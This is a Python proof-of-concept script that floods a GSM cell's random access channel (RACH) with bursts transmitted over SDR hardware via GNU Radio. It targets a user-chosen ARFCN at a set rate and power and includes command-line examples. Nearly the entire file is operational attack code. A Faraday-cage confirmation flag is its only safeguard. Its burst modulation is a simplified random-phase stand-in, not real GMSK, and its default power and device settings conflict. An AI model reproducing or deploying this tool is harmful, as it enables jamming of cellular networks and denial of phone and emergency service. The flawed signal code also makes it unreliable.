#!/usr/bin/env python3
"""
GSM RACH Flooding PoC - GNU Radio Hardware Implementation
==========================================================

Hardware implementation using GNU Radio for actual RF transmission.
This version transmits real RACH bursts via SDR hardware.

⚠️  WARNING: REQUIRES FARADAY CAGE - ACTUAL RF TRANSMISSION
"""

import sys
import time
import logging
import argparse
from datetime import datetime

logger = logging.getLogger("rach_flood_hw")
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

try:
    from gnuradio import gr, blocks, analog, digital
    from osmosdr import sink as osmo_sink
    GNURADIO_AVAILABLE = True
except ImportError:
    GNURADIO_AVAILABLE = False
    logger.error("GNU Radio not available. Install: sudo apt-get install gnuradio gr-osmosdr")


class GSMRACHTransmitter(gr.top_block):
    """
    GNU Radio flowgraph for GSM RACH transmission.
    
    This creates a complete transmitter chain:
    1. RACH burst generator
    2. GSM modulator (GMSK)
    3. Upsampler
    4. SDR sink (HackRF/BladeRF/USRP)
    """
    
    def __init__(self, frequency, sample_rate=2e6, tx_gain=0, device="hackrf=0"):
        gr.top_block.__init__(self, "GSM RACH Transmitter")
        
        self.frequency = frequency
        self.sample_rate = sample_rate
        self.tx_gain = tx_gain
        
        logger.info(f"Initializing SDR transmitter...")
        logger.info(f"  Frequency: {frequency/1e6:.3f} MHz")
        logger.info(f"  Sample rate: {sample_rate/1e6:.1f} Msps")
        logger.info(f"  TX gain: {tx_gain} dB")
        logger.info(f"  Device: {device}")
        
        # SDR Sink
        try:
            self.osmosdr_sink = osmo_sink(args=device)
            self.osmosdr_sink.set_sample_rate(sample_rate)
            self.osmosdr_sink.set_center_freq(frequency, 0)
            self.osmosdr_sink.set_freq_corr(0, 0)
            self.osmosdr_sink.set_gain(tx_gain, 0)
            self.osmosdr_sink.set_if_gain(20, 0)
            self.osmosdr_sink.set_bb_gain(20, 0)
            self.osmosdr_sink.set_antenna('', 0)
            self.osmosdr_sink.set_bandwidth(0, 0)
        except Exception as e:
            logger.error(f"Failed to initialize SDR: {e}")
            raise
        
        # Vector source for RACH bursts (will be updated dynamically)
        self.vector_source = blocks.vector_source_c([], True)
        
        # Connect flowgraph
        self.connect(self.vector_source, self.osmosdr_sink)
        
        logger.info("SDR transmitter initialized successfully")
    
    def update_burst_data(self, burst_samples):
        """Update the burst data being transmitted."""
        self.vector_source.set_data(burst_samples)


def generate_rach_burst_samples(sample_rate=2e6):
    """
    Generate GSM RACH burst as IQ samples.
    
    This is a simplified version. For production, use proper GSM modulation
    from gr-gsm or implement full GMSK modulator.
    
    Returns:
        List of complex IQ samples
    """
    import numpy as np
    import random
    
    # GSM RACH burst timing
    burst_duration = 0.577e-3  # 577 microseconds (GSM timeslot)
    num_samples = int(burst_duration * sample_rate)
    
    # Generate random RACH reference
    rach_ref = random.randint(0, 255)
    
    # Simplified GMSK-like modulation (for demonstration)
    # In production, use proper GSM modulation from gr-gsm
    
    # Generate random phase shifts (simulating GMSK)
    phase = np.zeros(num_samples)
    for i in range(1, num_samples):
        phase[i] = phase[i-1] + random.choice([-np.pi/2, np.pi/2])
    
    # Convert to IQ samples
    iq_samples = np.exp(1j * phase) * 0.5  # Amplitude 0.5 to avoid clipping
    
    return iq_samples.tolist()


def rach_flood_hardware(arfcn, duration=60, burst_rate=100, tx_power=-10, device="hackrf=0"):
    """
    Execute RACH flood with actual hardware transmission.
    
    Args:
        arfcn: Target ARFCN
        duration: Flood duration in seconds
        burst_rate: Bursts per second
        tx_power: TX power in dB
        device: SDR device string
    """
    
    if not GNURADIO_AVAILABLE:
        logger.error("GNU Radio not available - cannot proceed with hardware mode")
        return False
    
    # Convert ARFCN to frequency
    freq = arfcn_to_frequency(arfcn)
    logger.info(f"Target ARFCN {arfcn} -> {freq/1e6:.3f} MHz")
    
    # Safety check
    logger.warning("=" * 70)
    logger.warning("⚠️  ACTUAL RF TRANSMISSION STARTING")
    logger.warning("⚠️  ENSURE FARADAY CAGE IS SEALED")
    logger.warning("=" * 70)
    logger.warning("Starting in 5 seconds... Press Ctrl+C to abort")
    
    try:
        for i in range(5, 0, -1):
            logger.warning(f"  {i}...")
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Aborted by user")
        return False
    
    logger.info("Starting RACH flood transmission...")
    
    try:
        # Create transmitter
        tb = GSMRACHTransmitter(
            frequency=freq,
            sample_rate=2e6,
            tx_gain=tx_power,
            device=device
        )
        
        # Start flowgraph
        tb.start()
        logger.info("Transmission started")
        
        start_time = time.time()
        burst_count = 0
        burst_interval = 1.0 / burst_rate
        
        while (time.time() - start_time) < duration:
            # Generate new RACH burst
            burst_samples = generate_rach_burst_samples()
            tb.update_burst_data(burst_samples)
            
            burst_count += 1
            
            # Progress update
            if burst_count % burst_rate == 0:
                elapsed = time.time() - start_time
                logger.info(f"Bursts transmitted: {burst_count} | Elapsed: {elapsed:.1f}s")
            
            time.sleep(burst_interval)
        
        # Stop transmission
        tb.stop()
        tb.wait()
        
        elapsed = time.time() - start_time
        actual_rate = burst_count / elapsed
        
        logger.info("=" * 70)
        logger.info("RACH flood completed")
        logger.info(f"  Total bursts: {burst_count}")
        logger.info(f"  Actual rate: {actual_rate:.1f} bursts/sec")
        logger.info(f"  Duration: {elapsed:.1f} seconds")
        logger.info("=" * 70)
        
        return True
        
    except KeyboardInterrupt:
        logger.warning("Transmission interrupted by user")
        tb.stop()
        tb.wait()
        return False
    except Exception as e:
        logger.error(f"Transmission error: {e}")
        import traceback
        traceback.print_exc()
        return False


def arfcn_to_frequency(arfcn):
    """Convert ARFCN to uplink frequency in Hz."""
    if 0 <= arfcn <= 124:
        return (890.0 + 0.2 * arfcn) * 1e6
    elif 975 <= arfcn <= 1023:
        return (890.0 + 0.2 * (arfcn - 1024)) * 1e6
    elif 512 <= arfcn <= 885:
        return (1710.0 + 0.2 * (arfcn - 512)) * 1e6
    else:
        raise ValueError(f"Invalid ARFCN: {arfcn}")


def main():
    parser = argparse.ArgumentParser(
        description="GSM RACH Flood - Hardware Implementation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
⚠️  WARNING: This script performs ACTUAL RF TRANSMISSION
    - Faraday cage is MANDATORY
    - Ensure proper licensing
    - Use minimal TX power

Examples:
  python poc_rach_flood_gnuradio.py 51 --duration 30 --tx-power -15
  python poc_rach_flood_gnuradio.py 62 --burst-rate 200 --device "hackrf=0"
        """
    )
    
    parser.add_argument("arfcn", type=int, help="Target ARFCN")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
    parser.add_argument("--burst-rate", type=int, default=100, help="Bursts per second")
    parser.add_argument("--tx-power", type=int, default=10, help="TX gain in dB (USRP: 0-89)")
    parser.add_argument("--device", default="type=b200", help="SDR device string (USRP B210: type=b200)")
    parser.add_argument("--faraday-cage-confirmed", action="store_true", 
                       help="Confirm Faraday cage in use (REQUIRED)")
    
    args = parser.parse_args()
    
    # Safety check
    if not args.faraday_cage_confirmed:
        logger.error("=" * 70)
        logger.error("SAFETY CHECK FAILED")
        logger.error("You must confirm Faraday cage usage with:")
        logger.error("  --faraday-cage-confirmed")
        logger.error("=" * 70)
        sys.exit(1)
    
    # Execute
    success = rach_flood_hardware(
        arfcn=args.arfcn,
        duration=args.duration,
        burst_rate=args.burst_rate,
        tx_power=args.tx_power,
        device=args.device
    )
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
